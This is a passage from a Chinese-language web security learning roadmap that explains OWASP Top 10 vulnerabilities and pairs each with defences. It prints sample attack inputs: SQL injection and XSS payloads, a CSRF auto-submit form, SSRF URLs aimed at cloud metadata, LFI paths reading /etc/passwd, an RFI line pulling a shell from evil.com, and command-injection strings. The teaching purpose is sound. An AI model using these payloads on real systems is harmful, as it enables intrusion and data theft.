## 阶段三：Web 安全核心（1 ~ 2 个月）

### 3.1 OWASP Top 10 漏洞全解析

#### 🔴 SQL 注入（重中之重）

```sql
-- 经典联合查询注入
' UNION SELECT 1,username,password FROM users--

-- 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--

-- 盲注（布尔型）
' AND (SELECT LENGTH(database()))>5--

-- 时间盲注
' AND IF(1=1,SLEEP(5),0)--
```

**防御**：参数化查询（[[PreparedStatement]]）、WAF、输入校验、最小权限

#### 🔴 XSS（跨站脚本攻击）

| 类型      | 原理               | 示例                            |
| --------- | ------------------ | ------------------------------- |
| 反射型XSS | 参数直接回显到页面 | `<script>alert(1)</script>`     |
| 存储型XSS | 恶意代码存入数据库 | 留言板注入脚本                  |
| DOM型XSS  | 前端JS动态渲染     | `document.write(location.hash)` |

**防御**：输出编码（HTML [[Entity]] Encode）、CSP（Content Security Policy）、HttpOnly Cookie

#### 🔴 CSRF（跨站请求伪造）

```html
<!-- 自动提交的隐藏表单 -->
<form action="http://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit()</script>
```

**防御**：CSRF Token、SameSite Cookie、Referer 校验

#### 🔴 SSRF（服务端请求伪造）

```
攻击者 → 服务器（被利用） → 内网服务
?url=http://127.0.0.1:6379/   # 访问内网Redis
?url=http://169.254.169.254/   # 云服务器元数据
```

#### 🔴 文件上传漏洞

```
绕过方式：
├── 前端 JS 验证绕过（修改后缀+抓包改回）
├── MIME 类型绕过（修改 Content-Type）
├── 后缀绕过：.php5、.phtml、.php%00.jpg（空字节截断）
├── .htaccess 攻击
├── 二次渲染绕过
└── 图片马 + 文件包含
```

#### 🔴 文件包含

```
LFI（本地文件包含）：
?page=../../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php

RFI（远程文件包含）：
?page=http://evil.com/shell.txt

PHP 伪协议：
php://input、php://filter、data://、phar://
```

#### 🔴 命令注入

```bash
; cat /etc/passwd          # 分号
| cat /etc/passwd          # 管道符
$(cat /etc/passwd)         # 命令替换
`cat /etc/passwd`          # 反引号
|| whoami                  # 逻辑或
&& whoami                  # 逻辑与
```

#### 其他重要漏洞

| 漏洞类型 | 关键点                                    |
| -------- | ----------------------------------------- |
| XXE      | XML外部实体注入，可读取文件、SSRF、RCE    |
| 反序列化 | Java/PHP/Python 不安全反序列化，RCE       |
| 逻辑漏洞 | 越权访问（水平/垂直）、支付漏洞、密码重置 |
| JWT攻击  | 算法篡改、密钥爆破、空签名                |
| SSTI     | 模板注入（Jinja2/Thymeleaf/Freemarker）   |
| CORS     | 跨域配置不当导致数据泄露                  |

## ⚠️ 重要提醒

1. **合法合规**：只在授权范围内进行安全测试，使用靶场或获得书面授权
2. **不要贪多**：按阶段学习，每个阶段扎实后再进入下一阶段
3. **实践为王**：网络安全是实操型技能，理论必须结合实战
4. **持续学习**：安全领域日新月异，终身学习是唯一出路
5. **白帽子精神**：真正的黑客是守护者，不是破坏者

> *"知道为什么能攻破，才知道怎么去防御。"* —— 安全的本质是攻防对抗的认知升级。
